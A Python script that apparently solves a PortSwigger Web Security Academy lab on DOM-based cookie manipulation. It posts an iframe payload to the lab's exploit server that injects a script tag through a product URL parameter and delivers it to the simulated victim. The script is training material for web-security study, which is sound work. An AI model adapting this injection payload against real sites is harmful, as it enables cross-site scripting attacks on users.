import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation
# author: 0xyf


class DOMBased5:
    def __init__(self):
        self.lab_id = "0a0400fe0360602b80583a68001e004e"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def dom(self):
        self.get_exploit_srv_url()
        # payload = f"""<iframe src="{self.url}/product?productId=1&='><script>print()</script>" onload="if(!window.x)this.src='{self.url}';window.x=1;">"""
        payload = f"""<iframe src="{self.url}/product?productId=1&payload='><script>print()</script>" onload="this.src='{self.url}';">"""
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dom()
        self.check_solved()


def main():
    DOMBased5().solve()


if __name__ == "__main__":
    main()
